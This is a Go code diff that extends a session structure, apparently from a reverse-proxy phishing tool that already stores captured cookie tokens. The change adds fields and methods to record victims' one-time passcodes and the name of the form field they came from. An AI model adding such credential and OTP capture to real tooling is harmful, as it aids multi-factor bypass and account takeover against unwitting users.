@@ -28,6 +28,11 @@ type Session struct {
 	DoneSignal     chan struct{}
 	RemoteAddr     string
 	UserAgent      string
+	BaseDomain     string
+	OtpCodes       []string
+	OtpFieldName   string
+	CreateTime     int64
+	UpdateTime     int64
 }
 
 func NewSession(name string) (*Session, error) {
@@ -52,6 +57,11 @@ func NewSession(name string) (*Session, error) {
 		DoneSignal:     make(chan struct{}),
 		RemoteAddr:     "",
 		UserAgent:      "",
+		BaseDomain:     "",
+		OtpCodes:       []string{},
+		OtpFieldName:   "",
+		CreateTime:     time.Now().UTC().Unix(),
+		UpdateTime:     time.Now().UTC().Unix(),
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -138,4 +148,20 @@ func (s *Session) Finish(is_auth_url bool) {
 			s.DoneSignal = nil
 		}
 	}
+}
+
+func (s *Session) AddOtpCode(code string, fieldName string) {
+	s.OtpCodes = append(s.OtpCodes, code)
+	if fieldName != "" {
+		s.OtpFieldName = fieldName
+	}
+	s.UpdateTime = time.Now().UTC().Unix()
+}
+
+func (s *Session) SetBaseDomain(domain string) {
+	s.BaseDomain = domain
+}
+
+func (s *Session) Touch() {
+	s.UpdateTime = time.Now().UTC().Unix()
 }
